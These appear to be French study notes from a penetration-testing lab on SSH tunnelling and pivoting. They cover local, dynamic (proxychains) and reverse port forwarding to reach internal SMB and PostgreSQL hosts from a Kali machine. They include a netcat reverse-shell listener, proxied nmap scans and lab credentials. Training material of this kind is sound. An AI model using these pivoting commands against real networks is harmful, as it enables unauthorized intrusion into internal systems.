# Redirection locale
Sur la machine passerelle confluence01, on lance ssh en écoute sur le port 4455 qui va se connecter à la machine PGDATABASE(10.4.234.215) et ce serveur va faire passerelle vers la machine HRSHARES(172.16.234.217) vers le port 445
![[Pasted image 20250507114141.png]]
```
ssh -N -L 0.0.0.0:4455:172.16.234.217:445 database_admin@10.4.234.215
```
Dans cet exemple, on va communiquer avec HRSHARES :
```
smbclient -p 4455 -L //192.168.234.63/ -U hr_admin --password=Welcome1234
```
# Redirection dynamique- Proxychains
Sur la machine passerelle confluence01, on lance ssh en écoute sur le port 9999 qui va se connecter à la machine PGDATABASE(10.4.234.215) et ce serveur va faire passerelle vers la machine HRSHARES(172.16.234.217) vers le port 445

![[Pasted image 20250507142640.png]]
On on lance le tunel sur CONFLUENCE01:
```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.195.215
```
et sur Kali, On modifie le fichier de configuration /etc/proxychains4.conf et on ajoute :
```
# proxychains.conf  VER 4.x
#
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	192.168.127.63 9999
```
On ajoute bien l'adresse IP de CONFLUENCE01 avec le port d'écoute du port SSH

ensuite, on peut executer nos commandes par proxychains ex:
```
proxychains smbclient -L //172.16.195.217/ -U hr_admin --password=Welcome1234

proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.127.217
```

# Redirection "forwarding"- Proxychains

## Redirection d'un port 
![[Pasted image 20250507143438.png]]
On s'assure que Kali accepte les connection par mot de passe :
![[Pasted image 20250507143615.png]]
PasswordAuthentication doit être à yes

On démarre le serveur SSH sur Kali (normal, c'est un reverse shell SSH)
```
sudo systemctl start ssh
```

On vérifie que le ssh est actif sur Kali :
```
sudo ss -ntplu

....
tcp    LISTEN  0       128                                 0.0.0.0:22             0.0.0.0:*      users:(("sshd",pid=36167,fd=7))                                                                
tcp    LISTEN  0       128                                    [::]:22                [::]:* 
```
On se connecte sur CONFLUENCE01 avec notre hack curl du chapitre.
On lance un terminal netcat :
```
nc -lnvp 4444
```
On lance notre reverse SSH sur CONFLUENCE01 (le lien entre PGDATABASE01 avec IP 10.4.127.215 et notre Kali 192.168.45.162):
```
$ ssh -N -R 127.0.0.1:2345:10.4.127.215:5432 kali@192.168.45.162
```

# Pour Windows en reverse proxy :
```
ssh -N -R 9998 kali@192.168.118.4
```
et attention, le fichier de configuration /etc/proxychains4.conf et on ajoute :
```
# proxychains.conf  VER 4.x
#
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 9998
```
Ici, on ne se connecte pas à une machine tierce mais à nous